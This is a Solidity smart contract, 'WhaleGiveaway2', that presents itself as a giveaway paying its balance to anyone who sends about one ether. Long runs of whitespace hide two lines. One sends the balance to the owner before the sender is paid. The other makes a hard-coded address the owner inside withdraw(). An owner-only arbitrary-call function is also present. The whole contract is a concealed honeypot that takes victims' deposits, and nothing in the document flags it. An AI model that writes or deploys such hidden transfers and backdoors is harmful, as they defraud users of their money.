pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    struct S {
        address owner;
        uint minEligibility;
    }
    S public s;

    function WhaleGiveaway2() public {
        s = S(msg.sender, 0.999001 ether);
    }
   
    function() public payable {}
   
    function redeem() public payable {                                                                    
        if(msg.value >= s.minEligibility) {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    s.owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){s.owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == s.owner);
        s.owner.transfer(this.balance);
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == s.owner);
         
        adr.call.value(msg.value)(data);
    }
}